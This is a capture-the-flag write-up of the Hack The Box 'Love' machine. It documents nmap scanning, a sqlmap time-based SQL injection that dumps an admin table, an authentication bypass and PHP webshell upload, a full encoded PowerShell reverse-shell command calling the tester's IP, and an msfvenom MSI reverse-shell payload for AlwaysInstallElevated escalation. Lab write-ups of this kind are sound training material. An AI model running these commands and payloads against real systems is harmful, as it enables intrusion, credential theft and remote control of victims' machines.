# Love Write-Up - HTB

## Recon

### Network Scanning:

Starting of with nmap:

```
sudo nmap -sS -Pn -n 10.10.10.239 -oN syn_common_ports.txt
```

```
#Output:
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
5000/tcp open  upnp
```

Moving towards vulnerability scan:

```
PORTS=$(grep "open" syn_common_ports.txt | awk -F '/' '{print $1}' | tr '\n' ',' | sed 's/,$//'); sudo nmap -sVC -Pn -n -p ${PORTS} -oN vuln_scan.txt 10.10.10.239
```

```
#Output:
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Voting System using PHP
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
| fingerprint-strings: 
|   DNSStatusRequestTCP, FourOhFourRequest, HTTPOptions, Help, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, RPCCheck, RTSPRequest, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe: 
|_    Host '10.10.16.8' is not allowed to connect to this MariaDB server
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden

```

Ports of interest: 80, 443, 5000 | 445 | 3306. I will first check SMB due to simplicity.

## Enumeration

### SMB:&#x20;

```
smbclient -N -L //10.10.10.239/
```

<figure><img src="../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

### HTTP/S:

#### Port 80:

<figure><img src="../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

#### Port 443:

<figure><img src="../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

Port 5000:

<figure><img src="../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

After trying few SSRF attempts and more enumeration. All that I found to be useful is the /admin endpoint.

Therefore I tried more directory busting on it to see if there are some php files that are less sanitized. At first I thought it really works because this endpoint had plenty!

```
/includes             (Status: 301) [Size: 346] [--> http://10.10.10.239/admin/includes/]
```

Although nothing much. Then I brought up the injections.

## Footholding

I directly tried them on the /admin endpoint.

```
[22:40:43] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 539 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=tt' AND (SELECT 6225 FROM (SELECT(SLEEP(5)))Pcgn)-- FPrr&password=tt&login=
---
[22:41:23] [INFO] the back-end DBMS is MySQL
[22:41:23] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web application technology: PHP 7.3.27, Apache 2.4.46
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[22:41:28] [INFO] fetching current database
[22:41:28] [INFO] retrieved: 
[22:41:39] [INFO] adjusting time delay to 2 seconds due to good response times
votesystem
current database: 'votesystem'
[22:43:00] [INFO] fetched data logged to text files under '/home/czr/.local/share/sqlmap/output/love.htb'
[22:43:00] [WARNING] your sqlmap version is outdated

[*] ending @ 22:43:00 /2025-04-25/

```

Let's see what tables are in there:

```
sqlmap -r request2 -p username --dbms=mysql -D votesystem --tables
```

```
#Output:
Database: votesystem
[5 tables]
+------------+
| admin      |
| candidates |
| positions  |
| voters     |
| votes      |
+------------+
```

Let's now go for the admin table:

```
sqlmap -r request2 -p username --dbms=mysql --time-sec=3 -D votesystem -T admin --dump
```

```
[23:29:57] [INFO] retrieved: admin
Database: votesystem
Table: admin
[1 entry]
+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+
| id | photo                       | lastname | password                                                     | username | firstname | created_on |
+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+
| 1  | facebook-profile-image.jpeg | Devierte | $2y$10$4E3VVe2PWlTMejquTmMD6.Og9RmmFN.K5A1n99kHNdQxHePutFjsC | admin    | Neovic    | 2018-04-02 |
+----+-----------------------------+----------+--------------------------------------------------------------+----------+-----------+------------+

```

Eventually this time-based SQLi made me realize we are not on the intended path. The BCrypt is 100% not to be cracked.

So I start google more, actually I ditched google some time ago and now I use russian and chinese search engines beacuse they are more convinient and reliable when querying nowadays, especially for pentest.

I stumbled upon this: [https://www.exploit-db.com/exploits/49843](https://www.exploit-db.com/exploits/49843)

Followed the PoC: [https://secure77.de/php-voting-system-admin-authentication-bypass-sqli/](https://secure77.de/php-voting-system-admin-authentication-bypass-sqli/)

<figure><img src="../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

The add new voter function permits upload.

<figure><img src="../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

Uploaded a php webshell:

<figure><img src="../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

Open it and run commands:

<figure><img src="../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

Let's get a reverse shell:

```
http://10.10.10.239/images/webshell.php?cmd=cmd%20/c%20powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.10.16.8%27%2C9999%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

<figure><img src="../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

Sweet!

<figure><img src="../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

## PrivEsc

As we see we already got user access. I ran a quick whoami /all:

```
#Output:

====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE               Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

Suffice is to say that only Phoebe and Administrator are on this sys. So it's super worth checking the history, at some point Phoebe had to use admin rights.&#x20;

```
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

<pre><code><strong>#Output:
</strong><strong>curl 10.10.14.9:8000/dControl.zip -o dControl.zip
</strong></code></pre>

I couldn't find this file on the system.

Moving forward. AlwaysElevated is on, along-side with so many other PrivEsc vectors.

I crafted a .msi with msfvenom.

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.8 LPORT=4444 -f msi -o rev.msi
```

Set-up a listener on 4444

```
nc -lvnp 4444
```

Transfer the exploit to the target.

Run it and receive the reverse shell back:

<figure><img src="../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

Easy!
